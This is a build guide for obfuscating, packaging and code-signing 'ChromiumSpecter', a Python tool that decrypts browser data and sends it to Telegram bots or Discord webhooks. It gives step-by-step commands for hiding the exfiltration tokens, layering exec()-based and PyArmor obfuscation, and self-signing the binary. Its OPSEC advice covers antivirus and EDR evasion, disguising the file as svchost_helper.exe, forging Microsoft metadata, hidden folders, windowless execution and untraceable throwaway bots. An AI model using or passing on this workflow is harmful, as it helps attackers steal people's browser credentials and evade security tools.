# 🛡️ Hybrid Obfuscation Master Guide

> [!NOTE]
> **English Version** | [Versión en Español](OBFUSCATION_GUIDE.md)

This guide details the professional workflow to protect the **ChromiumSpecter** suite against reverse engineering, static analysis, and heuristic antivirus (AV/EDR) detections.

---

## 🏗️ The Four-Layer Architecture

To achieve a binary with maximum resistance, we apply four progressive and cumulative levels of protection:

### 🛡️ Level 1: Data Obfuscation (Base64)

* **Objective**: Prevent Telegram/Discord tokens from appearing as plain text in the binary. Tools like `strings.exe`, `binwalk`, or `Detect-It-Easy` would detect them immediately.
* **What it protects**: Configuration strings (tokens, webhooks, IDs).
* **Limitation**: Does not protect program logic, only static data.

### 🛡️ Level 2: Source Obfuscation (`ofuscator.py`)

* **Objective**: Transform the source code into metamorphic encryption layers executed dynamically in memory via `exec()`, eliminating direct readability of the `.py` file.
* **What it protects**: AES decryption logic, browser paths, exfiltration functions.
* **Limitation**: The `.pyc` bytecode can still be decompiled with `uncompyle6` or `decompile3` if Level 3 is not applied.

### 🛡️ Level 3: Bytecode Shielding (`PyArmor`)

* **Objective**: Encrypt Python bytecode with a unique key per build. Even if someone extracts the `.pyc` from the bundle, they will read encrypted data without the PyArmor Runtime Library.
* **What it protects**: The internal structure of the executable against decompilers.
* **Limitation**: PyArmor adds the Runtime Library as a dependency. Some advanced EDRs are aware of its signature.

### 🛡️ Level 4: Digital Code Signing (`autocert.sh`)

* **Objective**: Give the `.exe` the appearance of legitimate software. Many AVs and SmartScreen reduce their analysis level for signed binaries.
* **What it protects**: Against heuristic detections based on "unsigned binary = suspicious".
* **Limitation**: A self-signed certificate does not pass SmartScreen (it shows "Unknown Publisher"). A full bypass requires a trusted CA certificate.

---

## 🔧 Prerequisites and Installation

Before starting, install all necessary dependencies:

```bash
# ── Python (Windows/Linux) ───────────────────────────────────────────
pip install pyarmor pyinstaller pycryptodomex pywin32 requests

# ── Signing Tools (Linux/WSL only) ───────────────────────────────────
sudo apt install openssl osslsigncode -y   # Debian/Ubuntu/WSL
# sudo pacman -Sy openssl osslsigncode     # Arch Linux
# brew install openssl osslsigncode        # macOS
```

> [!NOTE]
> `pywin32` only installs correctly on Windows. On Linux, it is for development only — final compilation must always be done on Windows.

---

## 🚀 Step-by-Step Workflow

### Step 1: Backup Original and Configure Credentials

> [!IMPORTANT]
> Make a backup of `main.py` before obfuscating it. The process is destructive to the source file.

```bash
# Mandatory backup before obfuscating
copy main.py main.py.bak     # Windows CMD
# cp main.py main.py.bak    # Linux/WSL
```

Then fill in your Base64 credentials in `main.py`:

```python
HARDCODED_TG_TOKEN   = "MTIzNDU2Nzg5MDpBQkMtREVGM..."  # base64(TOKEN)
HARDCODED_TG_ID      = "OTg3NjU0MzIx"                  # base64(CHAT_ID)
HARDCODED_DS_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS..."  # base64(WEBHOOK_URL)
```

**How to convert to Base64:**

```bash
# Linux/WSL
echo -n "1234567890:ABCdef..." | base64

# Python (any platform)
python -c "import base64; print(base64.b64encode(b'YOUR_TOKEN_HERE').decode())"
```

### Step 2: Generate Metamorphic Layers

> [!WARNING]
> **Known limitation of `ofuscator.py`**: The obfuscator removes all lines starting with `import` from the code body. If the file has an `import` within a `try:` block, the block remains empty and produces a `SyntaxError` when executing the obfuscated code. `main.py` is designed to avoid this by using `importlib.import_module()` instead of indented `import`.

Run the obfuscator on the source file:

```bash
python ofuscator.py main.py
```

Verify that the resulting file contains no readable strings:

```bash
# Linux/WSL — search for suspicious strings
strings main.py | grep -E "(telegram|discord|http|password|decrypt)"

# If it returns nothing relevant, obfuscation was successful ✅
```

### Step 3: Robust and Obfuscated Compilation (.exe)

To simplify the process and avoid compatibility errors between PyArmor versions, use the **`build.py`** script. This script automatically detects your environment and applies build best practices.

```bash
# Recommended: Single file, no console, custom name and icon
python build.py --name "SysHealth" --icon "icon.ico" --onefile --noconsole

# For quick compilation without obfuscation (PyInstaller only)
python build.py --no-obf --name "ChromiumAuditor"
```

> [!TIP]
> The resulting executable will be in the `dist/` folder (or the one you specify with `--dist-dir`).

#### Reduce .exe size (optional)

```bash
# UPX is NOT included with PyInstaller — download it from: https://upx.github.io/
# Extract the binary and point --upx-dir to the folder containing it:
pyinstaller --onefile --noconsole --upx-dir /path/to/upx_folder --name "ChromiumAuditor" main.py
```

### Step 4: Digital Signing of the Executable (Linux / WSL)

> [!IMPORTANT]
> Always execute **after** PyArmor/PyInstaller. Signing a file that is subsequently modified invalidates the signature and triggers additional alerts in some AVs.

```bash
# Copy the .exe to Linux/WSL and sign
bash autocert.sh dist/ChromiumAuditor.exe

# With custom PFX password
bash autocert.sh dist/ChromiumAuditor.exe "MySecurePassword"
```

**Verify the signature of the resulting .exe:**

```bash
# Linux/WSL
osslsigncode verify dist/ChromiumAuditor.exe

# Windows PowerShell
Get-AuthenticodeSignature ".\ChromiumAuditor.exe" | Format-List
```

---

## 🔍 Verification and Post-Build Testing

Before deploying the executable, validate that everything works and that stealth is effective:

### 1. Basic Functional Test

```bash
# Run and wait (if local path fails, check %APPDATA%\.audit\)
# Note: The .audit folder has the "Hidden" system attribute.
ChromiumAuditor.exe --no-wipe -v

# The report will appear as .audit/audit_report.html (or with a timestamp if it already existed)
```

### 2. Manual Static Analysis

```bash
# Linux/WSL — search for compromising strings in the .exe
strings ChromiumAuditor.exe | grep -iE "(telegram|discord|token|password|api\.telegram)"
# If it returns results, Level 1 (Base64) was not applied correctly
```

### 3. VirusTotal / Offline AV

> [!CAUTION]
> **Do not upload the .exe to VirusTotal for real testing** — hashes are shared publicly and the file is indexed permanently. Use offline alternatives:
>
> * `Windows Defender` in offline mode: `MpCmdRun.exe -Scan -ScanType 3 -File ChromiumAuditor.exe`
> * `ClamAV` on Linux: `clamscan ChromiumAuditor.exe`

### 4. Stealth Execution Test

```bash
# Verify that no black window appears when running from CMD
start /b ChromiumAuditor.exe
# No visible window should appear
```

---

## 🧯 Common Troubleshooting

| Issue | Cause | Solution |
| :--- | :--- | :--- |
| `ModuleNotFoundError: Cryptodome` when running .exe | PyInstaller didn't bundle the library | Add `--collect-all pycryptodomex` |
| `ModuleNotFoundError: win32api` | PyWin32 was not included | Add `--hidden-import=win32api --hidden-import=win32con` |
| The .exe opens and closes instantly | Silent error — log missing | Compile **with** `--console` first to see the exact error |
| PyArmor fails with `RuntimeError` | Incompatible version or PATH error | Use the **`build.py`** script which resolves this automatically |
| `osslsigncode: command not found` | Not installed | `sudo apt install osslsigncode` in WSL |
| SmartScreen blocks the .exe | Self-signed certificate | Click "More info → Run anyway" (expected with self-signed) |

---

## 📊 Protection Comparison

| Method | Data Protection | Logic Protection | Decompiler Resistance | SmartScreen Bypass | Approx. Size |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Standard PyInstaller** | ❌ Low | ❌ None | ❌ Very Low | ❌ No | ~15 MB |
| **`ofuscator.py` Only** | ✅ Medium | ✅ High | ⚠️ Medium | ❌ No | ~15 MB |
| **Hybrid (Lv. 1-3)** | ⭐ Maximum | ⭐ Maximum | ⭐ Maximum | ❌ No | ~18 MB |
| **Hybrid + Signing** | ⭐ Maximum | ⭐ Maximum | ⭐ Maximum | ⚠️ Partial | ~18 MB |

---

## ⚖️ OPSEC Recommendations (Operational Security)

* **Mandatory Backup**: Always save `main.py.bak` before obfuscating. The process is destructive.
* **Evade Heuristics**: If the binary is detected, compiling **without** the `--noconsole` option makes the process look like a standard internal Windows management tool.
* **Single-Use Bots**: Never use your main accounts. Create a dedicated Telegram bot or Discord Webhook for each audit and delete it afterward to prevent traceability.
* **Rename the `.exe`**: Names like "ChromiumAuditor" are suspicious. Prefer `SysHealth.exe`, `WinDiag.exe`, or `svchost_helper.exe`.
* **PE Metadata**: PyInstaller allows injecting metadata (Version, Company, Description) via `.spec`. A binary with metadata from "Microsoft Corporation" or "Intel" triggers less suspicion.
* **Timestamp and Signature**: `autocert.sh` uses DigiCert TSA so that the signature timestamp is plausible and doesn't match the system time if it was altered.

---
